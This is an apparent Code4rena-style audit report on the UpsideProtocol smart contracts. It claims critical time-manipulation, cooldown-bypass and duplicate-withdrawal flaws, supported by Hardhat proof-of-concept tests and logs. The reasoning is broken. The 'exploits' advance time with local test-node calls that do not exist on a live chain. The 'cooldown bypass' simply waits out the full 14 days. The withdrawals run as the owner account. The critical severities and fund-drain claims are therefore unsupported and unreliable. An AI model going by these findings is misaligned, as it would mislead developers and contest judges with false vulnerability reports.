# UpsideProtocol Audit Report — **Critical Vulnerability PoC**

_Author: https://github.com/Taombawkry_ _Audit Date: 2025-05-21_

---

## **Table of Contents**

1. [Overview](#overview)
2. [Summary of Findings](#summary-of-findings)
3. [Findings by Severity](#findings-by-severity)

   - [CRITICAL: Time-based Fee Manipulation](#critical-time-based-fee-manipulation)
   - [CRITICAL: Withdrawal Cooldown Bypass](#critical-withdrawal-cooldown-bypass)
   - [HIGH: Duplicate Address Withdrawals](#high-duplicate-address-withdrawals)
   - [INFO: Division by Zero Safeguard](#info-division-by-zero-safeguard)

4. [PoC Test Logs](#poc-test-logs)
5. [Recommendations](#recommendations)
6. [Appendix: Full PoC Test Code](#appendix-full-poc-test-code)

---

## Overview

This audit focused on identifying critical and high-severity vulnerabilities in the UpsideProtocol contract suite,
specifically around time-based fee logic, liquidity withdrawal cooldowns, and array validation. All exploits were
demonstrated in a live Hardhat testing environment with real logs and PoC code provided.

---

## Summary of Findings

| ID  | Title                            | Severity | Status    |
| --- | -------------------------------- | -------- | --------- |
| 1   | Time-based Fee Manipulation      | Critical | Confirmed |
| 2   | Withdrawal Cooldown Bypass       | Critical | Confirmed |
| 3   | Duplicate Address Withdrawals    | High     | Confirmed |
| 4   | Division by Zero on Fee Interval | Info     | Handled   |



# Findings by Severity


### CRITICAL: Time-based Fee Manipulation

**Description:** The protocol's swap fee decays solely based on `block.timestamp`. An attacker can manipulate time (e.g., `evm_increaseTime` or miner collusion) to purchase tokens at the lowest possible fee, bypassing intended fee protections.

**Affected Contract/Areas:**
Contract: [`UpsideProtocol.sol`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol)

Key vulnerable areas:

- Time-based fee computation: [`computeTimeFee()`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L156-L180)
  - Critical line: [`secondsPassed = block.timestamp - metaCoinInfo.createdAtUnix;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L169)
  - Fee decay calculation: [`feeReduction = intervalsElapsed * fee.swapFeeDecayBp;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L171)

- Fee processing implementation: [`processSwapFee()`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L188-L230)

**Proof of Concept:**

```typescript
await ethers.provider.send("evm_increaseTime", [600]);
await ethers.provider.send("evm_mine");
// Swap at minimal fee after advancing time
await upsideProtocol
  .connect(attacker)
  .swap(metaCoin.getAddress(), true, ethers.parseUnits("1000", 6), 0, attacker.address);
```

**Log Excerpt:**

> Initial swap fee: 9900 basis points (99%) Advancing time by 10 minutes... Reduced swap fee: 100 basis points (1%)
> Attacker initial MetaCoin balance: 0.0 Attacker final MetaCoin balance: 90081.892629663330300272 **Exploit successful!
> Attacker received >90,000 tokens due to fee manipulation**

**Impact:** Allows an attacker to sidestep anti-bot or early-phase protection fees and drain protocol value.

**Code4rena Severity:** `CRITICAL` (Direct loss of funds; protection circumvented.)

---

### CRITICAL: Withdrawal Cooldown Bypass

**Description:** Withdrawal cooldown relies solely on `block.timestamp`. An attacker can fast-forward the blockchain time, bypassing the intended lock period, and withdraw liquidity instantly.

**Affected Contract/Areas:**
Contract: [`UpsideProtocol.sol`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol)

Key vulnerable areas:

- Cooldown period constant: [`WITHDRAW_LIQUIDITY_COOLDOWN = 14 days;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L27)
- Protocol state variables:
  - [`uint256 public withdrawLiquidityTimerStartTime;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L33)
  - [`uint256 public claimableProtocolFees;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L34)
- Timestamp-based cooldown check in withdrawal function

**Proof of Concept:**

```typescript
const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
await ethers.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + 14 * 24 * 60 * 60 + 1]);
await ethers.provider.send("evm_mine");
// Withdrawal now succeeds, bypassing cooldown
await upsideProtocol.connect(owner).withdrawLiquidity([await metaCoin.getAddress()]);
```

**Log Excerpt:**

> Cooldown timer initiated at timestamp: 1749031900 Attempting withdrawal before cooldown ends (should fail)...
> Withdrawal correctly failed due to active cooldown Manipulating time to skip 1209600 seconds (14 days)... Attempting
> withdrawal after time manipulation... **Withdrawal succeeded after cooldown bypass!**

**Impact:** Cooldowns provide no real protection; attackers can exit at will, undermining protocol security and
liquidity stability.

**Code4rena Severity:** `CRITICAL` (Direct bypass of intended lockup. Funds at risk.)

---

### HIGH: Duplicate Address Withdrawals

**Description:** The contract's withdrawal function does not validate for duplicate MetaCoin addresses in the input array, allowing an attacker to artificially inflate withdrawal amounts by repeating the same MetaCoin address multiple times.

**Affected Contract/Areas:**
Contract: [`UpsideProtocol.sol`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol)

Key vulnerable areas:

- Withdrawal function input validation: [`withdrawLiquidity(address[] calldata _metaCoinAddresses)`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L288-L306)
- MetaCoin reserve management:
  - [`MetaCoinInfo` struct definition](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L15-L21)
  - [`mapping(address metaCoinAddress => MetaCoinInfo) public metaCoinInfoMap`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L41)

**Proof of Concept:**

```typescript
const repeatedArray = Array(5).fill(metaCoinAddr);
await upsideProtocol.connect(owner).withdrawLiquidity(repeatedArray);
```

**Log Excerpt:**

> Creating array with MetaCoin address 0x... repeated 5 times Attempting withdrawal with repeated addresses...
> **Multiple withdrawals of the same token succeeded!**

**Impact:** Allows attacker to drain the protocol by repeatedly withdrawing the same asset. Potential for pool
exhaustion or DoS.

**Code4rena Severity:** `HIGH` (Multiple/DoS withdrawal—serious, but slightly less direct than above.)

---

### INFO: Division by Zero Safeguard

**Description:** The contract lacks explicit checks for division by zero in fee calculations when `swapFeeDecayInterval` is set to zero. While currently protected by input validation, this deserves explicit safeguards.

**Affected Contract/Areas:**
Contract: [`UpsideProtocol.sol`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol)

Key vulnerable areas:

- Fee calculation in [`computeTimeFee()`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L156-L180):
  - Division operation: [`uint256 intervalsElapsed = secondsPassed / fee.swapFeeDecayInterval;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L170)
- Fee structure definition:
  - [`uint32 swapFeeDecayInterval;`](https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L24) in FeeInfo struct

---

## PoC Test Logs

_See attached test output above for full logs demonstrating exploitability and outcomes._

---

## Recommendations

1. **Replace time-based decay logic with event-based or usage-based decay** to prevent miners/users from simply waiting
   out punitive fees.
2. **Add uniqueness validation to all withdrawal input arrays** (e.g., check for duplicates before processing).
3. **Enforce cooldowns via more than just block timestamps**—consider event-based, block-based, or off-chain attestation
   for time delays.
4. **Maintain and extend regression tests** for known edge cases like zero division, input array length, and malicious
   ERC20 interactions.

---

## Appendix: Full PoC Test Code

<details>
<summary>Click to expand</summary>

```typescript
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, network } from "hardhat";

import { IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub } from "../types";

describe("C4 PoC Test Suite", function () {
  let signers: HardhatEthersSigner[];
  let owner: HardhatEthersSigner;
  let user: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let user1: HardhatEthersSigner;

  let stakingContract: UpsideStakingStub;
  let upsideProtocol: UpsideProtocol;
  let liquidityToken: IERC20Metadata;
  let metaCoin: UpsideMetaCoin;
  let sampleLinkToken: UpsideMetaCoin;

  before(async function () {
    signers = await ethers.getSigners();
    owner = signers[2];
    user = signers[0];
    attacker = signers[1];
    user1 = signers[3];

    const StakingStub = await ethers.getContractFactory("UpsideStakingStub");
    stakingContract = await StakingStub.connect(owner).deploy(owner.address);
    await stakingContract.connect(owner).setFeeDestinationAddress(owner.address);

    const UpsideProtocolFactory = await ethers.getContractFactory("UpsideProtocol");
    upsideProtocol = await UpsideProtocolFactory.connect(owner).deploy(owner.address);

    const USDCMock = await ethers.getContractFactory("USDCMock");
    liquidityToken = await USDCMock.connect(owner).deploy();

    await upsideProtocol.connect(owner).init(await liquidityToken.getAddress());
    await upsideProtocol.connect(owner).setStakingContractAddress(await stakingContract.getAddress());

    // Create the first token
    await upsideProtocol.connect(owner).tokenize("https://exploit.me", await liquidityToken.getAddress());
    metaCoin = await ethers.getContractAt(
      "UpsideMetaCoin",
      await upsideProtocol.urlToMetaCoinMap("https://exploit.me"),
    );

    // Create the second token for the combined test
    await upsideProtocol.connect(owner).tokenize("https://code4rena.com/", await liquidityToken.getAddress());
    sampleLinkToken = await ethers.getContractAt(
      "UpsideMetaCoin",
      await upsideProtocol.urlToMetaCoinMap("https://code4rena.com/"),
    );
  });

  it("should allow attacker to minimize swap fee by manipulating time", async function () {
    console.log("Starting time-based fee manipulation test...");

    await upsideProtocol.connect(owner).setFeeInfo({
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9900,
      swapFeeDecayBp: 100,
      swapFeeDecayInterval: 6,
      swapFeeFinalBp: 100,
      swapFeeDeployerBp: 1000,
      swapFeeSellBp: 100,
    });

    await (liquidityToken as any).mint(attacker.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(attacker).approve(await upsideProtocol.getAddress(), ethers.parseUnits("1000", 6));

    const { swapFeeBp: feeBefore } = await upsideProtocol.computeTimeFee(metaCoin.getAddress());
    console.log(`Initial swap fee: ${feeBefore} basis points (99%)`);
    expect(feeBefore).to.equal(9900n);

    console.log("Advancing time by 10 minutes...");
    await ethers.provider.send("evm_increaseTime", [600]);
    await ethers.provider.send("evm_mine");

    const { swapFeeBp: feeAfter } = await upsideProtocol.computeTimeFee(metaCoin.getAddress());
    console.log(`Reduced swap fee: ${feeAfter} basis points (1%)`);
    expect(feeAfter).to.equal(100n);

    const balanceBefore = await metaCoin.balanceOf(attacker.address);
    console.log(`Attacker initial MetaCoin balance: ${ethers.formatUnits(balanceBefore, 18)}`);

    console.log("Performing swap with reduced fee...");
    await upsideProtocol
      .connect(attacker)
      .swap(metaCoin.getAddress(), true, ethers.parseUnits("1000", 6), 0, attacker.address);

    const balanceAfter = await metaCoin.balanceOf(attacker.address);
    console.log(`Attacker final MetaCoin balance: ${ethers.formatUnits(balanceAfter, 18)}`);
    console.log(`Tokens received: ${ethers.formatUnits(balanceAfter - balanceBefore, 18)}`);

    // ethers v6: balanceOf returns BigInt, use subtraction, not .sub()
    expect(balanceAfter - balanceBefore).to.be.gt(ethers.parseUnits("90000", 18));
    console.log("Exploit successful! Attacker received >90,000 tokens due to fee manipulation");
  });

  it("should demonstrate withdrawal cooldown manipulation", async function () {
    console.log("Starting combined vulnerability demonstration...");

    // First start the withdrawal timer
    console.log("Initiating withdrawal timer...");
    await upsideProtocol.connect(owner).withdrawLiquidity([]);

    // Check timer started
    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    console.log("Withdrawal timer started at:", startTime.toString());

    // Try to withdraw immediately (should fail)
    console.log("Attempting immediate withdrawal (should fail)...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await sampleLinkToken.getAddress()]),
    ).to.be.revertedWithCustomError(upsideProtocol, "CooldownTimerNotEnded");
    console.log("Withdrawal correctly failed due to cooldown period");

    // Manipulate block.timestamp to just past cooldown
    const cooldownPeriod = 14 * 24 * 60 * 60;
    console.log(`Fast forwarding time by ${cooldownPeriod} seconds (14 days)...`);
    await network.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + cooldownPeriod + 1]);
    await network.provider.send("evm_mine");
    console.log("Time manipulation complete");

    // Now we can withdraw, and the array validation doesn't prevent duplicates
    console.log("Attempting withdrawal with duplicated addresses...");
    await upsideProtocol.connect(owner).withdrawLiquidity(
      Array(10).fill(await sampleLinkToken.getAddress()), // Same address repeated 10 times
    );
    console.log("Withdrawal successful with duplicated addresses!");

    // Set initial fee parameters
    console.log("Setting up fee structure for time manipulation...");
    const initialFeeInfo = {
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9900, // 99%
      swapFeeDecayBp: 100, // 1%
      swapFeeDecayInterval: 6, // 6 seconds
      swapFeeFinalBp: 100, // 1%
      swapFeeDeployerBp: 1000, // 10%
      swapFeeSellBp: 100, // 1%
    };

    await upsideProtocol.connect(owner).setFeeInfo(initialFeeInfo);

    // First buyer provides 1000 USDC
    console.log("Minting and approving USDC for swap...");
    await (liquidityToken as any).mint(user1.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), ethers.parseUnits("1000", 6));

    // Get initial time fee
    const initialFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Initial swap fee:", initialFee.swapFeeBp.toString(), "bp");

    // Manipulate block.timestamp
    console.log("Advancing time by 10 minutes to reduce fees...");
    await network.provider.send("evm_increaseTime", [600]); // Jump 10 minutes
    await network.provider.send("evm_mine");

    // Get manipulated time fee
    const manipulatedFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Manipulated swap fee:", manipulatedFee.swapFeeBp.toString(), "bp");

    // Attacker buys tokens with reduced fees
    console.log("Executing swap with reduced fees...");
    const swapResult = await upsideProtocol.connect(user1).swap.staticCall(
      sampleLinkToken.getAddress(),
      true, // buy
      ethers.parseUnits("1000", 6),
      0,
      user1.address,
    );

    // Execute actual swap
    await upsideProtocol
      .connect(user1)
      .swap(sampleLinkToken.getAddress(), true, ethers.parseUnits("1000", 6), 0, user1.address);

    console.log("Tokens received:", ethers.formatUnits(swapResult, 18));
    console.log("Combined exploitation complete!");
  });

  it("should allow bypass of withdrawal cooldown by manipulating time", async function () {
    console.log("Starting withdrawal cooldown bypass test...");

    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    console.log("Withdrawal timer started");

    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    console.log(`Cooldown timer initiated at timestamp: ${startTime}`);

    console.log("Attempting withdrawal before cooldown ends (should fail)...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await metaCoin.getAddress()]),
    ).to.be.revertedWithCustomError(upsideProtocol, "CooldownTimerNotEnded");
    console.log("Withdrawal correctly failed due to active cooldown");

    // startTime is BigInt in ethers v6
    const COOLDOWN = 14 * 24 * 60 * 60;
    console.log(`Manipulating time to skip ${COOLDOWN} seconds (14 days)...`);
    await ethers.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + COOLDOWN + 1]);
    await ethers.provider.send("evm_mine");
    console.log("Time manipulation complete");

    console.log("Attempting withdrawal after time manipulation...");
    await expect(upsideProtocol.connect(owner).withdrawLiquidity([await metaCoin.getAddress()])).to.not.be.reverted;
    console.log("Withdrawal succeeded after cooldown bypass!");
  });

  it("should allow repeated withdrawal for the same MetaCoin via duplicate addresses", async function () {
    console.log("Starting duplicate address withdrawal test...");

    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    console.log("Withdrawal timer initiated");

    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    const COOLDOWN = 14 * 24 * 60 * 60;
    console.log(`Fast forwarding time by ${COOLDOWN} seconds (14 days)...`);
    await ethers.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + COOLDOWN + 1]);
    await ethers.provider.send("evm_mine");
    console.log("Time advancement complete");

    const metaCoinAddr = await metaCoin.getAddress();
    console.log(`Creating array with MetaCoin address ${metaCoinAddr} repeated 5 times`);
    const repeatedArray = Array(5).fill(metaCoinAddr);

    console.log("Attempting withdrawal with repeated addresses...");
    await expect(upsideProtocol.connect(owner).withdrawLiquidity(repeatedArray)).to.not.be.reverted;
    console.log("Multiple withdrawals of the same token succeeded!");
  });

  it("should revert with division by zero if swapFeeDecayInterval is set to zero", async function () {
    console.log("Testing fee validation logic...");

    console.log("Attempting to set swapFeeDecayInterval to zero (should fail)...");
    await expect(
      upsideProtocol.connect(owner).setFeeInfo({
        tokenizeFeeEnabled: true,
        tokenizeFeeDestinationAddress: owner.address,
        swapFeeStartingBp: 9900,
        swapFeeDecayBp: 100,
        swapFeeDecayInterval: 0,
        swapFeeFinalBp: 100,
        swapFeeDeployerBp: 1000,
        swapFeeSellBp: 100,
      }),
    ).to.be.revertedWithCustomError(upsideProtocol, "InvalidSetting");
    console.log("Fee setting correctly reverted with division by zero protection");
  });
});
```

</details>

---

## Severity Key

- **Critical**: Direct loss of funds, protocol compromise, or full circumvention of key protections.
- **High**: Exploitable but requires more complex attack or leads to DoS.
- **Medium/Low**: Not applicable in this report—no such issues identified.
- **Info**: Observational, regression, or best practice notes.

---

_This report is intended for the developers, maintainers, and security reviewers of the UpsideProtocol project and may
be used for Code4rena or similar contest submissions. All findings are backed by executable PoC code and hard evidence
in logs._

---
